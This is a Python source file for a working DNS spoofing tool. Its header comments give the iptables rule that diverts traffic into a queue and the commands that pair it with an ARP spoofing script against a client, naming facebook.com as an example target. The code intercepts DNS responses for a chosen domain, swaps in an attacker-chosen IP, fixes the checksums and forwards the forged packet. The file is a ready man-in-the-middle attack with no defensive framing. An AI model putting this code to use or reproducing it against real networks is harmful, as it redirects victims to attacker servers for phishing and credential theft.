import netfilterqueue
import scapy.all as scapy
import optparse

# Redirect outcome packets to a queue: `iptables -I FORWARD -j NFQUEUE --queue-num 0`
# Run ARP spoofing: python3 ARP_spoofing.py --client 192.168.233.140 --access-point 192.168.233.2
# Run DNS spoofer: python3 DNS_spoofer.py --target facebook.com --ip 192.23.11.99

website = ""
fake_ip = ""


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        # Looking for a DNS response (DNSRR - DNS Resource Record).
        global fake_ip
        global website

        # Get domain question name.
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if website in qname:
            print("Found the DNS response:\n {}".format(scapy_packet.show()))

            ans = scapy.DNSRR(rrname=qname, rdata=fake_ip)

            # Set answer to the fake IP address.
            scapy_packet[scapy.DNS].an = ans

            # Set answer count to number 1.
            scapy_packet[scapy.DNS].ancount = 1

            # Delete the length fields, checksum fields in the IP layer and UDP layer.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set new payload.
            packet.set_payload(bytes(scapy_packet))

            print("Spoofing target website {} with IP: {}".format(
                website, fake_ip))

    else:
        # Not handle another requests.
        pass


    # Forward packets to the target.
    packet.accept()


def main():

    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target",
                      help="Target website.")

    parser.add_option("-i", "--ip", dest="ip",
                      help="Spoofing IP")

    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("Please specify an target website.")

    if not options.ip:
        parser.error("Please specify an spoofing ip.")

    global fake_ip
    fake_ip = str(options.ip)

    global website
    website = str(options.target)

    queue = netfilterqueue.NetfilterQueue()

    # Bind to queue number 0.
    queue.bind(0, process_packet)
    queue.run()


if __name__ == "__main__":
    main()
